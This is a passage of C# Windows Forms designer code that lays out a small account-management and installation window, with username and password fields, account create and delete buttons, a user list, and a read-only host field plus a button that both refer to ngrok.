        this.Password.AutoSizeHeight = true;
        this.Password.BackColor = System.Drawing.Color.Transparent;
        this.Password.BackgroundImage = (System.Drawing.Image)resources.GetObject("Password.BackgroundImage");
        this.Password.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Password.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.Password.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.Password.BorderColorIdle = System.Drawing.Color.Silver;
        this.Password.BorderRadius = 2;
        this.Password.BorderThickness = 1;
        this.Password.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.Password.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.Password.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.Password.DefaultText = "";
        this.Password.FillColor = System.Drawing.Color.White;
        this.Password.HideSelection = true;
        this.Password.IconLeft = null;
        this.Password.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.Password.IconPadding = 10;
        this.Password.IconRight = null;
        this.Password.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.Password.Lines = new string[0];
        this.Password.Location = new System.Drawing.Point(290, 143);
        this.Password.MaxLength = 32767;
        this.Password.MinimumSize = new System.Drawing.Size(1, 1);
        this.Password.Modified = false;
        this.Password.Multiline = false;
        this.Password.Name = "Password";
        stateProperties5.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties5.FillColor = System.Drawing.Color.Empty;
        stateProperties5.ForeColor = System.Drawing.Color.Empty;
        stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Password.OnActiveState = stateProperties5;
        stateProperties6.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties6.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties6.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.Password.OnDisabledState = stateProperties6;
        stateProperties7.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties7.FillColor = System.Drawing.Color.Empty;
        stateProperties7.ForeColor = System.Drawing.Color.Empty;
        stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Password.OnHoverState = stateProperties7;
        stateProperties8.BorderColor = System.Drawing.Color.Silver;
        stateProperties8.FillColor = System.Drawing.Color.White;
        stateProperties8.ForeColor = System.Drawing.Color.Empty;
        stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Password.OnIdleState = stateProperties8;
        this.Password.Padding = new System.Windows.Forms.Padding(3);
        this.Password.PasswordChar = '\0';
        this.Password.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.Password.PlaceholderText = "Password";
        this.Password.ReadOnly = false;
        this.Password.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.Password.SelectedText = "";
        this.Password.SelectionLength = 0;
        this.Password.SelectionStart = 0;
        this.Password.ShortcutsEnabled = true;
        this.Password.Size = new System.Drawing.Size(198, 28);
        this.Password.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.Password.TabIndex = 681;
        this.Password.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.Password.TextMarginBottom = 0;
        this.Password.TextMarginLeft = 3;
        this.Password.TextMarginTop = 1;
        this.Password.TextPlaceholder = "Password";
        this.Password.UseSystemPasswordChar = false;
        this.Password.WordWrap = true;
        this.TxUserName.AcceptsReturn = false;
        this.TxUserName.AcceptsTab = false;
        this.TxUserName.AnimationSpeed = 200;
        this.TxUserName.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TxUserName.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TxUserName.AutoSizeHeight = true;
        this.TxUserName.BackColor = System.Drawing.Color.Transparent;
        this.TxUserName.BackgroundImage = (System.Drawing.Image)resources.GetObject("TxUserName.BackgroundImage");
        this.TxUserName.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.TxUserName.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.TxUserName.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.TxUserName.BorderColorIdle = System.Drawing.Color.Silver;
        this.TxUserName.BorderRadius = 2;
        this.TxUserName.BorderThickness = 1;
        this.TxUserName.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TxUserName.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TxUserName.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.TxUserName.DefaultText = "";
        this.TxUserName.FillColor = System.Drawing.Color.White;
        this.TxUserName.HideSelection = true;
        this.TxUserName.IconLeft = null;
        this.TxUserName.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.TxUserName.IconPadding = 10;
        this.TxUserName.IconRight = null;
        this.TxUserName.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.TxUserName.Lines = new string[0];
        this.TxUserName.Location = new System.Drawing.Point(290, 106);
        this.TxUserName.MaxLength = 32767;
        this.TxUserName.MinimumSize = new System.Drawing.Size(1, 1);
        this.TxUserName.Modified = false;
        this.TxUserName.Multiline = false;
        this.TxUserName.Name = "TxUserName";
        stateProperties9.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties9.FillColor = System.Drawing.Color.Empty;
        stateProperties9.ForeColor = System.Drawing.Color.Empty;
        stateProperties9.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TxUserName.OnActiveState = stateProperties9;
        stateProperties10.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties10.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties10.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties10.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TxUserName.OnDisabledState = stateProperties10;
        stateProperties11.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties11.FillColor = System.Drawing.Color.Empty;
        stateProperties11.ForeColor = System.Drawing.Color.Empty;
        stateProperties11.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TxUserName.OnHoverState = stateProperties11;
        stateProperties12.BorderColor = System.Drawing.Color.Silver;
        stateProperties12.FillColor = System.Drawing.Color.White;
        stateProperties12.ForeColor = System.Drawing.Color.Empty;
        stateProperties12.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TxUserName.OnIdleState = stateProperties12;
        this.TxUserName.Padding = new System.Windows.Forms.Padding(3);
        this.TxUserName.PasswordChar = '\0';
        this.TxUserName.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TxUserName.PlaceholderText = "Username";
        this.TxUserName.ReadOnly = false;
        this.TxUserName.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TxUserName.SelectedText = "";
        this.TxUserName.SelectionLength = 0;
        this.TxUserName.SelectionStart = 0;
        this.TxUserName.ShortcutsEnabled = true;
        this.TxUserName.Size = new System.Drawing.Size(198, 28);
        this.TxUserName.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TxUserName.TabIndex = 680;
        this.TxUserName.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TxUserName.TextMarginBottom = 0;
        this.TxUserName.TextMarginLeft = 3;
        this.TxUserName.TextMarginTop = 1;
        this.TxUserName.TextPlaceholder = "Username";
        this.TxUserName.UseSystemPasswordChar = false;
        this.TxUserName.WordWrap = true;
        this.CreateAccount.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.CreateAccount.BackColor = System.Drawing.Color.White;
        this.CreateAccount.BorderRadius = 4;
        this.CreateAccount.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.CreateAccount.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.CreateAccount.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.CreateAccount.CheckedState.Parent = this.CreateAccount;
        this.CreateAccount.Cursor = System.Windows.Forms.Cursors.Hand;
        this.CreateAccount.CustomImages.Parent = this.CreateAccount;
        this.CreateAccount.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.CreateAccount.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.CreateAccount.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.CreateAccount.ForeColor = System.Drawing.Color.White;
        this.CreateAccount.HoverState.Parent = this.CreateAccount;
        this.CreateAccount.Location = new System.Drawing.Point(290, 177);
        this.CreateAccount.Name = "CreateAccount";
        this.CreateAccount.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.CreateAccount.PressedDepth = 50;
        this.CreateAccount.ShadowDecoration.Parent = this.CreateAccount;
        this.CreateAccount.Size = new System.Drawing.Size(198, 28);
        this.CreateAccount.TabIndex = 679;
        this.CreateAccount.Text = "Create";
        this.CreateAccount.Click += new System.EventHandler(CreateAccount_Click);
        this.DeleteAccount.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.DeleteAccount.BackColor = System.Drawing.Color.White;
        this.DeleteAccount.BorderRadius = 4;
        this.DeleteAccount.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DeleteAccount.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DeleteAccount.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.DeleteAccount.CheckedState.Parent = this.DeleteAccount;
        this.DeleteAccount.Cursor = System.Windows.Forms.Cursors.Hand;
        this.DeleteAccount.CustomImages.Parent = this.DeleteAccount;
        this.DeleteAccount.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.DeleteAccount.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.DeleteAccount.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.DeleteAccount.ForeColor = System.Drawing.Color.White;
        this.DeleteAccount.HoverState.Parent = this.DeleteAccount;
        this.DeleteAccount.Location = new System.Drawing.Point(290, 211);
        this.DeleteAccount.Name = "DeleteAccount";
        this.DeleteAccount.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.DeleteAccount.PressedDepth = 50;
        this.DeleteAccount.ShadowDecoration.Parent = this.DeleteAccount;
        this.DeleteAccount.Size = new System.Drawing.Size(198, 28);
        this.DeleteAccount.TabIndex = 678;
        this.DeleteAccount.Text = "Delete";
        this.DeleteAccount.Click += new System.EventHandler(DeleteAccount_Click);
        this.ListAllUsernsmr.Columns.AddRange(new System.Windows.Forms.ColumnHeader[3] { this.columnHeader1, this.columnHeader2, this.columnHeader3 });
        this.ListAllUsernsmr.FullRowSelect = true;
        this.ListAllUsernsmr.HideSelection = false;
        this.ListAllUsernsmr.Location = new System.Drawing.Point(7, 106);
        this.ListAllUsernsmr.MultiSelect = false;
        this.ListAllUsernsmr.Name = "ListAllUsernsmr";
        this.ListAllUsernsmr.Size = new System.Drawing.Size(277, 133);
        this.ListAllUsernsmr.TabIndex = 677;
        this.ListAllUsernsmr.UseCompatibleStateImageBehavior = false;
        this.ListAllUsernsmr.View = System.Windows.Forms.View.Details;
        this.columnHeader1.Text = "Username";
        this.columnHeader1.Width = 85;
        this.columnHeader2.Text = "Password";
        this.columnHeader2.Width = 105;
        this.columnHeader3.Text = "State";
        this.columnHeader3.Width = 82;
        this.HostNagrok.AcceptsReturn = false;
        this.HostNagrok.AcceptsTab = false;
        this.HostNagrok.AnimationSpeed = 200;
        this.HostNagrok.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.HostNagrok.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.HostNagrok.AutoSizeHeight = true;
        this.HostNagrok.BackColor = System.Drawing.Color.Transparent;
        this.HostNagrok.BackgroundImage = (System.Drawing.Image)resources.GetObject("HostNagrok.BackgroundImage");
        this.HostNagrok.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.HostNagrok.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.HostNagrok.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.HostNagrok.BorderColorIdle = System.Drawing.Color.Silver;
        this.HostNagrok.BorderRadius = 2;
        this.HostNagrok.BorderThickness = 1;
        this.HostNagrok.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.HostNagrok.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.HostNagrok.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.HostNagrok.DefaultText = "";
        this.HostNagrok.FillColor = System.Drawing.Color.White;
        this.HostNagrok.HideSelection = true;
        this.HostNagrok.IconLeft = null;
        this.HostNagrok.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.HostNagrok.IconPadding = 10;
        this.HostNagrok.IconRight = null;
        this.HostNagrok.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.HostNagrok.Lines = new string[0];
        this.HostNagrok.Location = new System.Drawing.Point(7, 72);
        this.HostNagrok.MaxLength = 32767;
        this.HostNagrok.MinimumSize = new System.Drawing.Size(1, 1);
        this.HostNagrok.Modified = false;
        this.HostNagrok.Multiline = false;
        this.HostNagrok.Name = "HostNagrok";
        stateProperties13.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties13.FillColor = System.Drawing.Color.Empty;
        stateProperties13.ForeColor = System.Drawing.Color.Empty;
        stateProperties13.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.HostNagrok.OnActiveState = stateProperties13;
        stateProperties14.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties14.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties14.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties14.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.HostNagrok.OnDisabledState = stateProperties14;
        stateProperties15.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties15.FillColor = System.Drawing.Color.Empty;
        stateProperties15.ForeColor = System.Drawing.Color.Empty;
        stateProperties15.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.HostNagrok.OnHoverState = stateProperties15;
        stateProperties16.BorderColor = System.Drawing.Color.Silver;
        stateProperties16.FillColor = System.Drawing.Color.White;
        stateProperties16.ForeColor = System.Drawing.Color.Empty;
        stateProperties16.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.HostNagrok.OnIdleState = stateProperties16;
        this.HostNagrok.Padding = new System.Windows.Forms.Padding(3);
        this.HostNagrok.PasswordChar = '\0';
        this.HostNagrok.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.HostNagrok.PlaceholderText = "Host";
        this.HostNagrok.ReadOnly = true;
        this.HostNagrok.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.HostNagrok.SelectedText = "";
        this.HostNagrok.SelectionLength = 0;
        this.HostNagrok.SelectionStart = 0;
        this.HostNagrok.ShortcutsEnabled = true;
        this.HostNagrok.Size = new System.Drawing.Size(481, 28);
        this.HostNagrok.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.HostNagrok.TabIndex = 676;
        this.HostNagrok.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.HostNagrok.TextMarginBottom = 0;
        this.HostNagrok.TextMarginLeft = 3;
        this.HostNagrok.TextMarginTop = 1;
        this.HostNagrok.TextPlaceholder = "Host";
        this.HostNagrok.UseSystemPasswordChar = false;
        this.HostNagrok.WordWrap = true;
        this.PaneControll.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PaneControll.Controls.Add(this.ButNagrok);
        this.PaneControll.Controls.Add(this.ButInstall);
        this.PaneControll.Controls.Add(this.ButAccount);
        this.PaneControll.Location = new System.Drawing.Point(16, 112);
        this.PaneControll.Name = "PaneControll";
        this.PaneControll.Size = new System.Drawing.Size(45, 280);
        this.PaneControll.TabIndex = 608;
        this.ButNagrok.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButNagrok.BackColor = System.Drawing.Color.Transparent;
        this.ButNagrok.BorderRadius = 10;
        this.ButNagrok.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButNagrok.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButNagrok.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButNagrok.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButNagrok.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButNagrok.CheckedState.Parent = this.ButNagrok;
        this.ButNagrok.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButNagrok.CustomBorderColor = System.Drawing.Color.White;
        this.ButNagrok.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButNagrok.CustomImages.CheckedImage");
        this.ButNagrok.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButNagrok.CustomImages.HoveredImage");
        this.ButNagrok.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButNagrok.CustomImages.Image");
        this.ButNagrok.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButNagrok.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButNagrok.CustomImages.Parent = this.ButNagrok;
        this.ButNagrok.FillColor = System.Drawing.Color.White;
        this.ButNagrok.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButNagrok.ForeColor = System.Drawing.Color.White;
        this.ButNagrok.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButNagrok.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButNagrok.HoverState.FillColor = System.Drawing.Color.White;
        this.ButNagrok.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButNagrok.HoverState.Parent = this.ButNagrok;
        this.ButNagrok.ImageSize = new System.Drawing.Size(27, 27);
        this.ButNagrok.Location = new System.Drawing.Point(3, 86);
        this.ButNagrok.Name = "ButNagrok";
        this.ButNagrok.PressedColor = System.Drawing.Color.White;
        this.ButNagrok.ShadowDecoration.Parent = this.ButNagrok;
        this.ButNagrok.Size = new System.Drawing.Size(38, 38);
        this.ButNagrok.TabIndex = 20;
        this.ButNagrok.UseTransparentBackground = true;
        this.ButNagrok.Click += new System.EventHandler(ButNagrok_Click);
        this.ButInstall.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButInstall.BackColor = System.Drawing.Color.Transparent;
        this.ButInstall.BorderRadius = 10;
        this.ButInstall.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButInstall.Checked = true;
        this.ButInstall.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButInstall.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButInstall.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButInstall.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButInstall.CheckedState.Parent = this.ButInstall;
        this.ButInstall.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButInstall.CustomBorderColor = System.Drawing.Color.White;
        this.ButInstall.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButInstall.CustomImages.CheckedImage");
        this.ButInstall.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButInstall.CustomImages.HoveredImage");
        this.ButInstall.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButInstall.CustomImages.Image");
        this.ButInstall.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButInstall.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButInstall.CustomImages.Parent = this.ButInstall;
        this.ButInstall.FillColor = System.Drawing.Color.White;
        this.ButInstall.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButInstall.ForeColor = System.Drawing.Color.White;
        this.ButInstall.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButInstall.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButInstall.HoverState.FillColor = System.Drawing.Color.White;
        this.ButInstall.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButInstall.HoverState.Parent = this.ButInstall;
        this.ButInstall.ImageSize = new System.Drawing.Size(27, 27);
        this.ButInstall.Location = new System.Drawing.Point(3, 42);
        this.ButInstall.Name = "ButInstall";
        this.ButInstall.PressedColor = System.Drawing.Color.White;
        this.ButInstall.ShadowDecoration.Parent = this.ButInstall;
        this.ButInstall.Size = new System.Drawing.Size(38, 38);
        this.ButInstall.TabIndex = 19;
        this.ButInstall.UseTransparentBackground = true;
        this.ButInstall.Click += new System.EventHandler(ButInstall_Click);
        this.ButAccount.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButAccount.BackColor = System.Drawing.Color.Transparent;
        this.ButAccount.BorderRadius = 10;
        this.ButAccount.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButAccount.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButAccount.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButAccount.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButAccount.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButAccount.CheckedState.Parent = this.ButAccount;
        this.ButAccount.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButAccount.CustomBorderColor = System.Drawing.Color.White;
        this.ButAccount.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButAccount.CustomImages.CheckedImage");
        this.ButAccount.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButAccount.CustomImages.HoveredImage");
        this.ButAccount.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButAccount.CustomImages.Image");
        this.ButAccount.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButAccount.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButAccount.CustomImages.Parent = this.ButAccount;
        this.ButAccount.FillColor = System.Drawing.Color.White;
        this.ButAccount.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButAccount.ForeColor = System.Drawing.Color.White;
        this.ButAccount.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButAccount.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButAccount.HoverState.FillColor = System.Drawing.Color.White;
        this.ButAccount.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButAccount.HoverState.Parent = this.ButAccount;
        this.ButAccount.ImageSize = new System.Drawing.Size(27, 27);
        this.ButAccount.Location = new System.Drawing.Point(3, 130);
        this.ButAccount.Name = "ButAccount";
        this.ButAccount.PressedColor = System.Drawing.Color.White;
        this.ButAccount.ShadowDecoration.Parent = this.ButAccount;
        this.ButAccount.Size = new System.Drawing.Size(38, 38);
        this.ButAccount.TabIndex = 17;
        this.ButAccount.UseTransparentBackground = true;
        this.ButAccount.Click += new System.EventHandler(ButAccount_Click);
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.TitlrPage);
        this.PanelTitle.Controls.Add(this.LoaderConnect);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.ImageLogo);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(560, 77);
        this.PanelTitle.TabIndex = 596;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(528, 12);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 609;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(505, 12);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 611;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.TitlrPage.AllowParentOverrides = false;
        this.TitlrPage.AutoEllipsis = false;
        this.TitlrPage.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.TitlrPage.CursorType = null;
        this.TitlrPage.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TitlrPage.ForeColor = System.Drawing.Color.DarkGray;
        this.TitlrPage.Location = new System.Drawing.Point(154, 19);
        this.TitlrPage.Name = "TitlrPage";
        this.TitlrPage.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitlrPage.Size = new System.Drawing.Size(58, 15);
        this.TitlrPage.TabIndex = 608;
        this.TitlrPage.Text = "Installation";
        this.TitlrPage.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.TitlrPage.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.LoaderConnect.AllowStylePresets = true;
        this.LoaderConnect.BackColor = System.Drawing.Color.Transparent;
        this.LoaderConnect.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.LoaderConnect.Color = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LoaderConnect.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.LoaderConnect.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.LoaderConnect.Customization = "";
        this.LoaderConnect.DashWidth = 0.5f;
        this.LoaderConnect.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LoaderConnect.Image = null;
        this.LoaderConnect.Location = new System.Drawing.Point(12, 13);
        this.LoaderConnect.Name = "LoaderConnect";
        this.LoaderConnect.NoRounding = false;
        this.LoaderConnect.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
        this.LoaderConnect.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.LoaderConnect.ShowText = false;
        this.LoaderConnect.Size = new System.Drawing.Size(57, 50);
        this.LoaderConnect.Speed = 7;
        this.LoaderConnect.TabIndex = 607;
        this.LoaderConnect.Text = "bunifuLoader1";
        this.LoaderConnect.TextPadding = new System.Windows.Forms.Padding(0);
        this.LoaderConnect.Thickness = 6;
        this.LoaderConnect.Transparent = true;
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.AutoSize = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
